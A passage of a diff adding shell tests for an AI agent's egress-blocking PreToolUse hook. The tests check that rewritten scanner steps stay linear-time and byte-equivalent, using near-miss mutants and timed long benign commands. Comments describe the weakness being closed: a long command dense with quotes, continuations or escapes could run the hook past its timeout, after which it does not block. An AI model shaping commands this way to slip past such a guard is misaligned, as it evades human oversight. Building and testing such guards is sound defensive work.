+# pass, is stopped at the budget on a long quote-span-dense command in UTF-8; the join has no bound,
+# so its copy also tests the line it has grown for an open comment at every join, as the join before
+# this pass did, and is stopped at the budget on a long continuation-dense command in UTF-8. X-FB
+# holds the walk's fallback.
+E007_Y_R="${E007_W_BASE}/y"
+/bin/mkdir -p "${E007_Y_R}/in"
+E007_Y_FUNCS="egress_long egress_cat egress_trailing_backslash_odd egress_comment_open_at_end egress_neutralize_into egress_neutralize_long egress_comment_neutralize egress_span_neutralize egress_ansic_span egress_ansic_decode egress_ansic_decode_long egress_split_bs egress_split_at egress_keep_line egress_base_gh egress_respell_word egress_brace_words egress_unescape_rv egress_unescape_long egress_fold_rv egress_mark_free_text egress_join_state egress_join_continuations egress_join_lines"
+# e007_y_lift <src> <out> — the walk, the join and every function they call; EGRESS_LINEAR_MIN is
+# left to the caller. Returns 1 unless every function is found.
+e007_y_lift() {
+  F="$E007_Y_FUNCS" /usr/bin/awk '
+    BEGIN { n = split(ENVIRON["F"], f, " "); for (i = 1; i <= n; i++) want[f[i] "() {"] = 1 }
+    !inf { for (k in want) if (index($0, k) == 1) { inf = 1; seen[k] = 1; break } }
+    inf { print; if ($0 == "}") inf = 0 }
+    END { c = 0; for (k in want) if (!(k in seen)) c++; exit c == 0 ? 0 : 1 }' "$1" > "$2"
+}
+# The texts: units cycled by a fixed generator to three lengths around and above the bound, then the
+# same units ending in an unclosed quote, an escaped quote left open, a continuation, an open comment,
+# a run of backslashes and a newline.
+LC_ALL=C /usr/bin/awk -v d="${E007_Y_R}/in" 'BEGIN {
+  n = split("", u)
+  u[++n] = "\047a\047 "; u[++n] = "\"b\" "; u[++n] = "\"a\\\"b\" "; u[++n] = "$\047\\x41\\047\047 "
+  u[++n] = "$\"z\" "; u[++n] = "# it\047s \"x\" "; u[++n] = "\\\n"; u[++n] = "  --flag value \\\n"
+  u[++n] = "x #y \\\n"; u[++n] = "# c \\\n"; u[++n] = "a##"; u[++n] = "\\\\\\"; u[++n] = "\n"
+  u[++n] = " "; u[++n] = "\t"; u[++n] = ";"; u[++n] = "&|"; u[++n] = "(x)"; u[++n] = "`y`"; u[++n] = "<>"
+  u[++n] = "gh api"; u[++n] = " -X POST "; u[++n] = "\303\251"; u[++n] = "\346\227\245"; u[++n] = "\343\200\200#"
+  u[++n] = "\302\240#"; u[++n] = "\342\200\203"; u[++n] = "\377"; u[++n] = "\303"; u[++n] = "\001\004\005"
+  u[++n] = "{a,b}"; u[++n] = "x=y"; u[++n] = "\047\047"; u[++n] = "$\047a\\\047b\047"
+  split("299 860 2100", size, " ")
+  split("|\047x|\"a\\\"x|\\\n|# open \047q|\\\\\\\\\\|\n", tail, "|")
+  x = 7; t = 0
+  for (r = 1; r <= 4; r++) for (z = 1; z <= 3; z++) {
+    s = ""; while (length(s) < size[z]) { x = (x * 1103515245 + 12345) % 2147483648; s = s u[int(x / 65536) % n + 1] }
+    printf "%s", s > (d "/t-" sprintf("%02d", ++t)); close(d "/t-" sprintf("%02d", t))
+  }
+  for (e = 1; e <= 7; e++) {
+    s = ""; while (length(s) < 600) { x = (x * 1103515245 + 12345) % 2147483648; s = s u[int(x / 65536) % n + 1] }
+    printf "%s%s", s, tail[e] > (d "/t-" sprintf("%02d", ++t)); close(d "/t-" sprintf("%02d", t))
+  }
+}'
+# e007_y_eval <locale> <bound> <lib> <out-dir> — each text through the walk (its text and status), the
+# two tests, and the join in both readings, one output file per text.
+e007_y_eval() {
+  /bin/mkdir -p "$4"
+  LC_ALL="$1" /bin/bash -c '. "$1"; readonly EGRESS_UC=ABCDEFGHIJKLMNOPQRSTUVWXYZ EGRESS_LC=abcdefghijklmnopqrstuvwxyz
+    EGRESS_LINEAR_MIN="$2"; . "$3"
+    for f in "$4"/t-*; do
+      s="$(/bin/cat "$f"; printf x)"; s="${s%x}"; st=0; a=0; b=0
+      EGRESS_NQ=""; egress_neutralize_into "$s" || st=$?
+      egress_comment_open_at_end "$s" && a=1
+      egress_trailing_backslash_odd "$s" && b=1
+      egress_norm="$s"; egress_join_continuations; j1="$egress_norm"
+      egress_norm="$s"; egress_join_continuations nokeep; j2="$egress_norm"
+      printf "%s %s %s\n%s\n--\n%s\n--\n%s" "$st" "$a" "$b" "$EGRESS_NQ" "$j1" "$j2" > "$5/${f##*/}"
+    done' _ "${E007_L_R}/prelude.sh" "$2" "$3" "${E007_Y_R}/in" "$4"
+}
+_y_why=""
+e007_y_lift "$E007_W_SRC" "${E007_Y_R}/lib" || _y_why="${_y_why} a function of the walk or the join is missing from the hook;"
+/usr/bin/grep -q '^egress_neutralize_long() {' "${E007_Y_R}/lib" && /usr/bin/grep -q '^egress_join_state() {' "${E007_Y_R}/lib" \
+  || _y_why="${_y_why} the hook carries no linear walk or join;"
+e007_l_swap "${E007_Y_R}/lib" 'HP=("" $'"'"'\n'"'"'); st=0' 'HP=(""); st=0' "${E007_Y_R}/nm-walk" || _y_why="${_y_why} the walk near miss did not apply;"
+e007_l_swap "${E007_Y_R}/lib" 'EGRESS_JOPL="${EGRESS_JOPL%\\}"' 'EGRESS_JOPL="${EGRESS_JOPL}"' "${E007_Y_R}/nm-join" || _y_why="${_y_why} the join near miss did not apply;"
+e007_l_swap "${E007_Y_R}/lib" 'if [ -n "$f" ]; then c=1; else' 'if [ -n "$f" ]; then c=0; else' "${E007_Y_R}/nm-trail" || _y_why="${_y_why} the trailing-backslash near miss did not apply;"
+_y_n="$(/bin/ls "${E007_Y_R}/in" | /usr/bin/wc -l | /usr/bin/tr -d ' ')"
+[ "$_y_n" -ge 19 ] || _y_why="${_y_why} only ${_y_n} texts were written;"
+if [ -z "$_y_why" ]; then
+  for _y_loc in en_US.UTF-8 C; do
+    e007_y_eval "$_y_loc" 1000000000 "${E007_Y_R}/lib" "${E007_Y_R}/${_y_loc}/ref" || _y_why="${_y_why} [${_y_loc}] the code before this pass did not run;"
+    e007_y_eval "$_y_loc" 0 "${E007_Y_R}/lib" "${E007_Y_R}/${_y_loc}/lin" || _y_why="${_y_why} [${_y_loc}] the long paths did not run;"
+    for _y_f in "${E007_Y_R}/in"/t-*; do
+      _y_k="${_y_f##*/}"
+      /usr/bin/cmp -s "${E007_Y_R}/${_y_loc}/ref/${_y_k}" "${E007_Y_R}/${_y_loc}/lin/${_y_k}" || _y_why="${_y_why} [${_y_loc} ${_y_k}] the long paths differ;"
+    done
+    for _y_nm in nm-walk nm-join nm-trail; do
+      e007_y_eval "$_y_loc" 0 "${E007_Y_R}/${_y_nm}" "${E007_Y_R}/${_y_loc}/${_y_nm}" || _y_why="${_y_why} [${_y_loc}] ${_y_nm} did not run;"
+      _y_d=0
+      for _y_f in "${E007_Y_R}/in"/t-*; do
+        _y_k="${_y_f##*/}"
+        /usr/bin/cmp -s "${E007_Y_R}/${_y_loc}/ref/${_y_k}" "${E007_Y_R}/${_y_loc}/${_y_nm}/${_y_k}" || _y_d=$(( _y_d + 1 ))
+      done
+      [ "$_y_d" -gt 0 ] || _y_why="${_y_why} [${_y_loc}] ${_y_nm} reads like the code before it (the comparison cannot see a difference);"
+    done
+  done
+fi
+if [ -z "$_y_why" ]; then
+  e007_d_pass "AC-E007-Y-EQ: the linear walk, join and tests equal the code before them byte for byte on ${_y_n} dense texts in UTF-8 and C, and three near misses each differ"
+else
+  e007_d_fail "AC-E007-Y-EQ: the linear walk, join and tests equal the code before them byte for byte" "$_y_why"
+fi
+# e007_y_cmd <shape> <bytes> <file> — a continuation-dense or quote-span-dense benign command; each
+# carries `gh`, so the fast path hands it to the scanner, and ends in a gh api read.
+e007_y_cmd() {
+  case "$1" in
+    continuation) e007_l_fill "$2" 'echo gh \'$'\n' '  --flag value word \'$'\n' '  end'$'\n''gh api repos/o/r' > "$3" ;;
+    spans)        e007_l_fill "$2" 'echo gh ' "'a' \"b\" " $'\n''gh api repos/o/r' > "$3" ;;
+  esac
+}
+for _y_shape in continuation spans; do
+  for _y_kb in 10 20 40; do e007_y_cmd "$_y_shape" $(( _y_kb * 1024 )) "${E007_Y_R}/${_y_shape}-${_y_kb}.cmd"; done
+done
+_y_n=0
+for _y_shape in continuation spans; do
+  for _y_loc in en_US.UTF-8 C; do
+    for _y_kb in 10 20 40; do
+      _y_n=$(( _y_n + 1 ))
+      e007_t_timed "$E007_W_S" "$_y_loc" "${E007_Y_R}/${_y_shape}-${_y_kb}.cmd" "$E007_T_LIMIT"
+      if [ "$E007_T_DS" != -1 ] && [ "$E007_T_EXIT" = 0 ]; then
+        e007_d_pass "AC-E007-Y${_y_n}: the ${_y_shape} shape at ${_y_kb} KB in ${_y_loc} clears the whole hook within the budget and is allowed"
+      else
+        e007_d_fail "AC-E007-Y${_y_n}: the long ${_y_shape} shape in ${_y_loc} clears the hook inside the budget and is allowed — measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of the budget, bound 1.00" \
+          "\"stopped\" is the watchdog ending the run at the budget; exit=${E007_T_EXIT} (want 0)"
+      fi
+    done
+  done
+done
+# The join's copy: the raised bound, and the keep test also asking whether the line grown so far ends
+# in an open comment — the test the join before this pass made at every join, on that line.
+E007_Y_X_GROWN='s|^    if \[ "\$EGRESS_JODD" -eq 1 ] && \[ "\$EGRESS_JCOPEN" -eq 0 ]; then$|    if [ "$EGRESS_JODD" -eq 1 ] \&\& egress_cat JC \&\& ! egress_comment_open_at_end "${EGRESS_J}${last}"; then|'
+E007_Y_GR="${E007_W_BASE}/ygr"; e007_w_copy "$E007_Y_GR" "$E007_L_X_NOPASS" "$E007_Y_X_GROWN"
+_y_why=""
+e007_t_timed "$E007_L_NP" en_US.UTF-8 "${E007_Y_R}/spans-10.cmd" "$E007_T_LIMIT"
+[ "$E007_T_DS" = -1 ] || _y_why="${_y_why} the walk's copy finished the 10 KB quote-span-dense command inside the budget, measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of it;"
+/usr/bin/grep -q -F -x 'readonly EGRESS_LINEAR_MIN=1000000000' "${E007_L_NP}/mut.sh" || _y_why="${_y_why} the walk's copy carries no raised bound;"
+e007_t_timed "$E007_Y_GR" en_US.UTF-8 "${E007_Y_R}/continuation-20.cmd" "$E007_T_LIMIT"
+[ "$E007_T_DS" = -1 ] || _y_why="${_y_why} the join's copy finished the 20 KB continuation-dense command inside the budget, measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of it;"
+/usr/bin/grep -q -F 'egress_comment_open_at_end "${EGRESS_J}${last}"' "${E007_Y_GR}/mut.sh" || _y_why="${_y_why} the join's copy carries no test of the grown line;"
+if [ -z "$_y_why" ]; then
+  e007_d_pass "AC-E007-Y-CTL: the walk's loop is stopped at the budget on a long quote-span-dense command and the join re-testing its grown line on a long continuation-dense command, in UTF-8 — the instrument sees each cost"
+else
+  e007_d_fail "AC-E007-Y-CTL: the walk's loop and the join re-testing its grown line are each stopped at the budget" \
+    "${_y_why} a copy that finishes cannot show Y1-Y12 measure anything (BROKEN PROBE)"
+fi
+
+# ---- AC-E007-Z* (#8315, DT pass 5): the ANSI-C decode and the word normalization are linear ----
+#
+# Two more steps of the scanner, both this release's code, cost more than linear time on bash 3.2 in
+# what they read. The ANSI-C decode stepped through the body left to decode once per escape, and the
+# word normalization through the word left to read once per backslash, each with removals and slices
+# that re-measure that text; and the keep rule and the case step took a long word's basename by a
+# removal that retries its match at every position it could end. A command holding one long ANSI-C
+# span of many escapes, or one long word dense with escapes on a line the join would take, could
+# therefore hold the hook past the runtime's command-hook timeout, after which a PreToolUse hook does
+# not block. A long body or word is now split once at its backslashes and read a field at a time
+# (egress_ansic_decode_long, egress_unescape_long, through egress_split_bs), a word in which no two
+# backslashes stand together having its fields joined as they are, and a long word's basename is
+# matched once (egress_base_gh) or read from its last characters (the case step). The trailing-
+# backslash test, which the ANSI-C reading applies to a long body and the join to a long line before
+# either is read, answers a text that does not end in a backslash by one match; Y-EQ pins it. Z-EQ
+# lifts these functions and runs them with the bound at 0 (every long path) and at 10^9 (the code
+# before this pass) on a dense set of texts — every escape the decoder reads and many it does not,
+# escapes that decode to NUL, runs of backslashes, multibyte letters, undecodable bytes, the scanner's
+# sentinels, glob characters, slashes, braces and case variants — in en_US.UTF-8 and in C: the decoded
+# text, the unescaped words, the normalized words, the basename test and the keep rule's verdicts must
+# be equal byte for byte, and eight near misses, each one edit of a long path, must each differ. Z1 to
+# Z16 run the whole sandbox hook under the watchdog on a command holding one long ANSI-C span of many
+# escapes and on a command whose continuation line is one long word dense with escapes, at 10, 20, 40
+# and 80 KB in both locales, each inside the budget and allowed. Z-CTL is the instrument's
+# sensitivity, one copy per site: the decode that never takes its long path is stopped at the budget
+# on a long ANSI-C command, and the word normalization and basename test that never take theirs on
+# a long escaped-word command, both in UTF-8.
+E007_Z_R="${E007_W_BASE}/z"
+/bin/mkdir -p "${E007_Z_R}/in"
+E007_Z_FUNCS="egress_long egress_cat egress_split_bs egress_split_at egress_ansic_decode egress_ansic_decode_long egress_unescape_rv egress_unescape_long egress_brace_words egress_fold_rv egress_respell_word egress_base_gh egress_keep_line"
+# e007_z_lift <src> <out> — the decode, the normalization, the keep rule and every function they call.
+e007_z_lift() {
+  F="$E007_Z_FUNCS" /usr/bin/awk '
+    BEGIN { n = split(ENVIRON["F"], f, " "); for (i = 1; i <= n; i++) want[f[i] "() {"] = 1 }
+    !inf { for (k in want) if (index($0, k) == 1) { inf = 1; seen[k] = 1; break } }
+    inf { print; if ($0 == "}") inf = 0 }
+    END { c = 0; for (k in want) if (!(k in seen)) c++; exit c == 0 ? 0 : 1 }' "$1" > "$2"
+}
+# The texts: units cycled by a fixed generator to four lengths around and above the bound, then the
+# same units ending in each edge the long paths treat apart — a final backslash, an even and an odd run
+# of them, an escape cut short, an escape that decodes to NUL with text after it, a basename gh with
+# and without a slash before it, a case variant with and without one, and a newline; then four texts
+# in which no two backslashes stand together, two of them ending in a lone backslash.
+LC_ALL=C /usr/bin/awk -v d="${E007_Z_R}/in" 'BEGIN {
+  n = split("", u)
+  u[++n] = "\\x41"; u[++n] = "\\x4"; u[++n] = "\\xg"; u[++n] = "\\x"; u[++n] = "\\xFf"; u[++n] = "\\x7e"
+  u[++n] = "\\u0041"; u[++n] = "\\u00e9"; u[++n] = "\\u07"; u[++n] = "\\u"; u[++n] = "\\U00000067"; u[++n] = "\\U0001F600"
+  u[++n] = "\\UZ"; u[++n] = "\\101"; u[++n] = "\\7"; u[++n] = "\\18"; u[++n] = "\\377"; u[++n] = "\\777"; u[++n] = "\\1234"
+  u[++n] = "\\\\"; u[++n] = "\\\047"; u[++n] = "\\\""; u[++n] = "\\?"; u[++n] = "\\a"; u[++n] = "\\b"; u[++n] = "\\e"
+  u[++n] = "\\E"; u[++n] = "\\f"; u[++n] = "\\n"; u[++n] = "\\r"; u[++n] = "\\t"; u[++n] = "\\v"; u[++n] = "\\q"
+  u[++n] = "\\ "; u[++n] = "\\g\\h"; u[++n] = "\\\303\251"; u[++n] = "\\\377"; u[++n] = "\\\303"; u[++n] = "\\\001"
+  u[++n] = "\\\177"; u[++n] = "\\\n"; u[++n] = "abc"; u[++n] = "/"; u[++n] = "/gh"; u[++n] = "/GH"; u[++n] = "gh"
+  u[++n] = " api"; u[++n] = "{a,b}"; u[++n] = ","; u[++n] = "\303\251"; u[++n] = "\346\227\245"; u[++n] = "\377"
+  u[++n] = "\303"; u[++n] = "\001\004\005\006"; u[++n] = "\177"; u[++n] = " "; u[++n] = "\t"; u[++n] = "\n"
+  u[++n] = "$"; u[++n] = "*?["
+  split("40 300 900 2500", size, " ")
+  split("|\\|\\\\|\\\\\\|\\x|\\u12|\\0tail\\x41|\\x00z\\101|\\400z|\\u0000z|xgh|/gh|\\/\\g\\h|xxxxxxGH|/usr/GH|\n", tail, "|")
+  x = 11; t = 0
+  for (r = 1; r <= 3; r++) for (z = 1; z <= 4; z++) {
+    s = ""; while (length(s) < size[z]) { x = (x * 1103515245 + 12345) % 2147483648; s = s u[int(x / 65536) % n + 1] }
+    printf "%s", s > (d "/t-" sprintf("%02d", ++t)); close(d "/t-" sprintf("%02d", t))
+  }
+  for (e = 1; e <= 16; e++) {
+    s = ""; while (length(s) < 600) { x = (x * 1103515245 + 12345) % 2147483648; s = s u[int(x / 65536) % n + 1] }
+    printf "%s%s", s, tail[e] > (d "/t-" sprintf("%02d", ++t)); close(d "/t-" sprintf("%02d", t))
+  }
+  for (w = 1; w <= 4; w++) {
+    s = ""; while (length(s) < (w <= 2 ? 300 : 2500)) {
+      x = (x * 1103515245 + 12345) % 2147483648; k = u[int(x / 65536) % n + 1]; if (k != "\\\\") s = s k }
+    printf "%s%s", s, (w % 2 ? "\\" : "z") > (d "/t-" sprintf("%02d", ++t)); close(d "/t-" sprintf("%02d", t))
+  }
+}'
+# e007_z_eval <locale> <bound> <lib> <out-dir> — each text through the decode, the escape step over
+# three words, the normalization with and without the case step, the basename test, and the keep rule
+# on the text alone, followed by `api`, and behind a word; one output file per text.
+e007_z_eval() {
+  /bin/mkdir -p "$4"
+  LC_ALL="$1" /bin/bash -c '. "$1"; readonly EGRESS_UC=ABCDEFGHIJKLMNOPQRSTUVWXYZ EGRESS_LC=abcdefghijklmnopqrstuvwxyz
+    EGRESS_LINEAR_MIN="$2"; . "$3"
+    for f in "$4"/t-*; do
+      s="$(/bin/cat "$f"; printf x)"; s="${s%x}"; g=0; k1=0; k2=0; k3=0
+      egress_ansic_decode "$s"; ac="$EGRESS_AC"
+      EGRESS_RV=( "$s" "a\\b" "$s" ); EGRESS_RVN=3; EGRESS_RVCH=0; egress_unescape_rv
+      un="${EGRESS_RV[0]}|${EGRESS_RV[1]}|${EGRESS_RV[2]}|${EGRESS_RVCH}"
+      egress_respell_word "$s" abc; r1="${EGRESS_RVN}|${EGRESS_RVCH}|${EGRESS_RVFOLD}|${EGRESS_RV[*]}"
+      egress_respell_word "$s" ab; r2="${EGRESS_RVN}|${EGRESS_RVCH}|${EGRESS_RVFOLD}|${EGRESS_RV[*]}"
+      egress_base_gh "$s" && g=1
+      egress_keep_line "$s" && k1=1
+      egress_keep_line "$s api" && k2=1
+      egress_keep_line "x $s api" && k3=1
+      printf "%s %s %s %s\n%s\n--\n%s\n--\n%s\n--\n%s" "$g" "$k1" "$k2" "$k3" "$ac" "$un" "$r1" "$r2" > "$5/${f##*/}"
+    done' _ "${E007_L_R}/prelude.sh" "$2" "$3" "${E007_Z_R}/in" "$4"
+}
+_z_why=""
+e007_z_lift "$E007_W_SRC" "${E007_Z_R}/lib" || _z_why="${_z_why} a function of the decode, the normalization or the keep rule is missing from the hook;"
+# The near misses, each one edit of a long path: the decode drops the backslash an escaped backslash
+# yields; it drops the quote character an escaped quote yields; it reads on past a decoded NUL; the
+# escape step keeps a backslash that ends the word, and joins a word holding two backslashes together
+# as if none were; the split loses the field after a final backslash; the basename test takes any word
+# ending in gh; and the case step reads a basename one character short.
+_z_nm="nm-esc nm-quote nm-nul nm-trail nm-fast nm-split nm-base nm-fold"
+e007_l_swap "${E007_Z_R}/lib" 'AP[${#AP[@]}]='"'"'\'"'" 'AP[${#AP[@]}]='"''" "${E007_Z_R}/nm-esc" || _z_why="${_z_why} the escaped-backslash near miss did not apply;"
+e007_l_swap "${E007_Z_R}/lib" 'AP[${#AP[@]}]="$f"; continue ;;' 'AP[${#AP[@]}]="${f:1}"; continue ;;' "${E007_Z_R}/nm-quote" || _z_why="${_z_why} the escaped-quote near miss did not apply;"
+e007_l_swap "${E007_Z_R}/lib" '[ "$v" -ne 0 ] || break' '[ "$v" -ne 0 ] || :' "${E007_Z_R}/nm-nul" || _z_why="${_z_why} the NUL near miss did not apply;"
+e007_l_swap "${E007_Z_R}/lib" 'if [ "$i" -lt "$k" ]; then' 'if true; then' "${E007_Z_R}/nm-trail" || _z_why="${_z_why} the final-backslash near miss did not apply;"
+e007_l_swap "${E007_Z_R}/lib" '*'"'"'\\'"'"'*)' '*'"'"'\\\\'"'"'*)' "${E007_Z_R}/nm-fast" || _z_why="${_z_why} the joined-fields near miss did not apply;"
+e007_l_swap "${E007_Z_R}/lib" 'EGRESS_BS[${#EGRESS_BS[@]}]=""' ':' "${E007_Z_R}/nm-split" || _z_why="${_z_why} the split near miss did not apply;"
+e007_l_swap "${E007_Z_R}/lib" 'gh|*/gh) return 0' 'gh|*gh) return 0' "${E007_Z_R}/nm-base" || _z_why="${_z_why} the basename near miss did not apply;"
+e007_l_swap "${E007_Z_R}/lib" '*) base="$t" ;;' '*) base="${t#?}" ;;' "${E007_Z_R}/nm-fold" || _z_why="${_z_why} the case-step near miss did not apply;"
+_z_n="$(/bin/ls "${E007_Z_R}/in" | /usr/bin/wc -l | /usr/bin/tr -d ' ')"
+[ "$_z_n" -ge 32 ] || _z_why="${_z_why} only ${_z_n} texts were written;"
+if [ -z "$_z_why" ]; then
+  for _z_loc in en_US.UTF-8 C; do
+    e007_z_eval "$_z_loc" 1000000000 "${E007_Z_R}/lib" "${E007_Z_R}/${_z_loc}/ref" || _z_why="${_z_why} [${_z_loc}] the code before this pass did not run;"
+    e007_z_eval "$_z_loc" 0 "${E007_Z_R}/lib" "${E007_Z_R}/${_z_loc}/lin" || _z_why="${_z_why} [${_z_loc}] the long paths did not run;"
+    for _z_f in "${E007_Z_R}/in"/t-*; do
+      _z_k="${_z_f##*/}"
+      /usr/bin/cmp -s "${E007_Z_R}/${_z_loc}/ref/${_z_k}" "${E007_Z_R}/${_z_loc}/lin/${_z_k}" || _z_why="${_z_why} [${_z_loc} ${_z_k}] the long paths differ;"
+    done
+    for _z_m in $_z_nm; do
+      e007_z_eval "$_z_loc" 0 "${E007_Z_R}/${_z_m}" "${E007_Z_R}/${_z_loc}/${_z_m}" || _z_why="${_z_why} [${_z_loc}] ${_z_m} did not run;"
+      _z_d=0
+      for _z_f in "${E007_Z_R}/in"/t-*; do
+        _z_k="${_z_f##*/}"
+        /usr/bin/cmp -s "${E007_Z_R}/${_z_loc}/ref/${_z_k}" "${E007_Z_R}/${_z_loc}/${_z_m}/${_z_k}" || _z_d=$(( _z_d + 1 ))
+      done
+      [ "$_z_d" -gt 0 ] || _z_why="${_z_why} [${_z_loc}] ${_z_m} reads like the code before it (the comparison cannot see a difference);"
+    done
+  done
+fi
+if [ -z "$_z_why" ]; then
+  e007_d_pass "AC-E007-Z-EQ: the linear decode, escape step, basename test and case step equal the code before them byte for byte on ${_z_n} dense texts in UTF-8 and C, through the keep rule as well, and eight near misses each differ"
+else
+  e007_d_fail "AC-E007-Z-EQ: the linear decode, escape step, basename test and case step equal the code before them byte for byte" "$_z_why"
+fi
+# e007_z_cmd <shape> <bytes> <file> — a benign command holding one long ANSI-C span of many escapes, or
+# one whose continuation line is one long word dense with escapes; each carries `gh`, so the fast path
+# hands it to the scanner, and ends in a gh api read.
+e007_z_cmd() {
+  case "$1" in
+    ansic) e007_l_fill "$2" "echo gh \$'" '\\\x41\101\t' "'"$'\n''gh api repos/o/r' > "$3" ;;
+    word)  e007_l_fill "$2" 'echo gh \'$'\n' '\g\h' $'\n''gh api repos/o/r' > "$3" ;;
+  esac
+}
+for _z_shape in ansic word; do
+  for _z_kb in 10 20 40 80; do e007_z_cmd "$_z_shape" $(( _z_kb * 1024 )) "${E007_Z_R}/${_z_shape}-${_z_kb}.cmd"; done
+done
+_z_n=0
+for _z_shape in ansic word; do
+  for _z_loc in en_US.UTF-8 C; do
+    for _z_kb in 10 20 40 80; do
+      _z_n=$(( _z_n + 1 ))
+      e007_t_timed "$E007_W_S" "$_z_loc" "${E007_Z_R}/${_z_shape}-${_z_kb}.cmd" "$E007_T_LIMIT"
+      if [ "$E007_T_DS" != -1 ] && [ "$E007_T_EXIT" = 0 ]; then
+        e007_d_pass "AC-E007-Z${_z_n}: the ${_z_shape} shape at ${_z_kb} KB in ${_z_loc} clears the whole hook within the budget and is allowed"
+      else
+        e007_d_fail "AC-E007-Z${_z_n}: the long ${_z_shape} shape in ${_z_loc} clears the hook inside the budget and is allowed — measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of the budget, bound 1.00" \
+          "\"stopped\" is the watchdog ending the run at the budget; exit=${E007_T_EXIT} (want 0)"
+      fi
+    done
+  done
+done
+# The sensitivity copies: one whose decode never takes its long path, and one whose escape step and
+# basename test never take theirs.
+E007_Z_X_NOANSIC='s|^\(  if \)egress_long "\$s"\(; then egress_ansic_decode_long .*  # linear: ansic\)$|\1false\2|'
+E007_Z_X_NOUNESC='s|^\(        if \)egress_long "\$s"\(; then egress_unescape_long .*  # linear: unescape\)$|\1false\2|'
+E007_Z_X_NOBASE='s|^\(  if \)egress_long "\$1"\(; then case .*  # linear: base\)$|\1false\2|'
+E007_Z_AC="${E007_W_BASE}/zac"; e007_w_copy "$E007_Z_AC" "$E007_Z_X_NOANSIC"
+E007_Z_WD="${E007_W_BASE}/zwd"; e007_w_copy "$E007_Z_WD" "$E007_Z_X_NOUNESC" "$E007_Z_X_NOBASE"
+_z_why=""
+e007_t_timed "$E007_Z_AC" en_US.UTF-8 "${E007_Z_R}/ansic-80.cmd" "$E007_T_LIMIT"
+[ "$E007_T_DS" = -1 ] || _z_why="${_z_why} the decode's copy finished the 80 KB ANSI-C command inside the budget, measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of it;"
+[ "$(/usr/bin/grep -c -e '^  if false; then egress_ansic_decode_long ' "${E007_Z_AC}/mut.sh")" = 1 ] || _z_why="${_z_why} the decode's copy does not carry its edit;"
+e007_t_timed "$E007_Z_WD" en_US.UTF-8 "${E007_Z_R}/word-80.cmd" "$E007_T_LIMIT"
+[ "$E007_T_DS" = -1 ] || _z_why="${_z_why} the word copy finished the 80 KB escaped-word command inside the budget, measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of it;"
+[ "$(/usr/bin/grep -c -e '^        if false; then egress_unescape_long ' -e '^  if false; then case ' "${E007_Z_WD}/mut.sh")" = 2 ] || _z_why="${_z_why} the word copy does not carry its two edits;"
+if [ -z "$_z_why" ]; then
+  e007_d_pass "AC-E007-Z-CTL: the decode without its long path is stopped at the budget on a long ANSI-C command, and the escape step and basename test without theirs on a long escaped-word command, in UTF-8 — the instrument sees each cost"
+else
+  e007_d_fail "AC-E007-Z-CTL: the decode, and the escape step and basename test, each without its long path, are stopped at the budget" \
+    "${_z_why} a copy that finishes cannot show Z1-Z16 measure anything (BROKEN PROBE)"
+fi
+
+# ---- AC-E007-N* (#8315, DT pass 8): five more steps of the scanner read their text once ----
+#
+# Five steps of the -007 scanner cost more than linear time on bash 3.2 in what they read, so a command
+# shaped for one of them could hold the hook past the runtime's command-hook timeout, after which a
+# PreToolUse hook does not block. Each now reads its text once, and one block below holds each: NB the
+# command-word normalization of a long brace group (its brace step, the escape step over the group's
+# words, and the splice that puts them in the token list), NR the redirection-word test, NQ the restore
+# of quoted operators, NF the short-flag cluster reader, and NH the head walk's basename read of a long
+# command word, which the widened fast path admits in its upper-case and escaped spellings.
+#
+# A block's EQ arm splices the code before its change back into a copy of the shipped hook and runs both
+# on a dense set of words and token lists — braces and commas in every place, digit runs and `{name}`
+# descriptors, quoted-operator stand-ins, runs of -i, slashes, case variants, backslashes, the scanner's
+# sentinels, multibyte letters and undecodable bytes, around and above the bound — in en_US.UTF-8 and C:
+# equal byte for byte, while near misses, each one edit of the new code, differ (NH compares the whole
+# hook instead, on commands that reach the walk). Its timed arms run the whole sandbox hook under the
+# watchdog on each shape that reaches its step, at 10, 20, 40 and 80 KB in both locales, beside a neutral
+# twin of the same length whose long run the step does not read: the least of three interleaved runs of
+# each keeps the shape within E007_N_BOUND times its twin (NB's within its own bound, E007_NB_BOUND), inside
+# the budget, and both allowed. Its CTL arm is the instrument's sensitivity: the copy with the code before
+# is beyond the block's bound on the step's shape.
+# A passing line prints the verdict and the bound, a failing one the measured ratio and the bound; no
+# line prints a time.
+E007_N_R="${E007_W_BASE}/n"
+/bin/mkdir -p "${E007_N_R}/in"
+E007_N_BOUND="${E007_N_BOUND:-2.0}"
+# NB's own bound (DT pass 10). The long brace group's words are built and normalized on the shape and not on
+# its twin, so the shape costs a near-constant multiple of the twin that sits close to 2.0, and a run on a
+# loaded host could read it over E007_N_BOUND with no change behind it. Set from measurement on the head:
+# every NB cell in both locales over ten interleaved rounds, beside other suites running on the same host.
+# Each cell's reading moved by at most about 0.3 across the rounds, and every reading lay between about 1.5
+# and about 2.0; 3.0 leaves about half again the largest reading as headroom for slower, noisier runners,
+# and the NB control, the code before pass 8, still runs to the watchdog, far beyond it.
+E007_NB_BOUND="${E007_NB_BOUND:-3.0}"
+E007_N_K=0
+# The timer: the least of <reps> interleaved runs of the hook on a shape and on its twin, each read by a
+# blocking wait under a timer watchdog that stops the run and its process group at the limit. Prints the
+# shape's and the twin's least run and the largest exit status, or -1 three times when a run was stopped.
+E007_N_PY='import json, os, signal, subprocess, sys, threading, time
+root, loc, reps, limit, shape, twin = sys.argv[1], sys.argv[2], int(sys.argv[3]), float(sys.argv[4]), sys.argv[5], sys.argv[6]
+hook = os.path.join(root, ".claude", "hooks", "block-egress.sh")
+env = dict(os.environ, LC_ALL=loc, PMO_SCOPE_GUARD_ROOT=root, PMO_PLATFORM_CONFIG_ROOT=os.path.join(root, ".cfg"))
+def payload(p):
+    with open(p, encoding="utf-8") as fh:
+        return json.dumps({"tool_name": "Bash", "tool_input": {"command": fh.read()}, "cwd": root}).encode()
+def one(data):
+    stopped = []
+    t0 = time.time()
+    r = subprocess.Popen(["/bin/bash", hook], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env, start_new_session=True)
+    def stop():
+        stopped.append(1)
+        try:
+            os.killpg(r.pid, signal.SIGKILL)
+        except OSError:
